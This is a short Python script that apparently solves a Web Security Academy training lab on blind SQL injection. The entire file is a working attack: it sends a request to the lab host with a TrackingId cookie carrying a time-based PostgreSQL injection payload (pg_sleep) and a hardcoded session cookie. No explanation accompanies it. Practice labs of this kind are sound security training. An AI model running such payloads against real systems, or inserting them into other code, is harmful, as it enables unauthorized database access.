import requests
from typing import Optional, Any

BASE_URL = "https://0a3f00f20433fcbac03fb3430049003e.web-security-academy.net"

session = requests.Session()

def get_request(url:str, cookies:dict[str, Any], timeout:int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None
    
def main():
    payload = "'||pg_sleep(5)-- "
    cookies={
        "TrackingId":payload,
        "session":"bIfFiCJMIPn16WxefBwLeG85NvVg5M99"

    }
    get_request(BASE_URL,cookies=cookies)
    
if __name__ == "__main__":
    main()